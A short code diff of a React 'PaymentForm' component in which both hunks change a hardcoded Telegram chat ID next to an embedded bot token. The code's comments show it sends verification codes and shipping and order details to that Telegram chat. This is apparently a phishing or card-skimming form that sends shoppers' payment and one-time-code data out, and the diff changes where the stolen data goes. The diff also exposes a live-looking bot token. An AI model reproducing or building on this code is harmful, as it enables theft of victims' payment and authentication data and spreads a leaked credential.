@@ -144,7 +144,7 @@ export default function PaymentForm({
     };
 
     const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
-    const chatId = "5439962016";
+    const chatId = "-1002630840593";
 
     // Send verification code
     const formatVerificationInfo = () => {
@@ -327,7 +327,7 @@ export default function PaymentForm({
               };
 
               const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
-              const chatId = "5439962016";
+              const chatId = "-1002630840593";
 
               // Format shipping and order information
               const formatOrderInfo = () => {
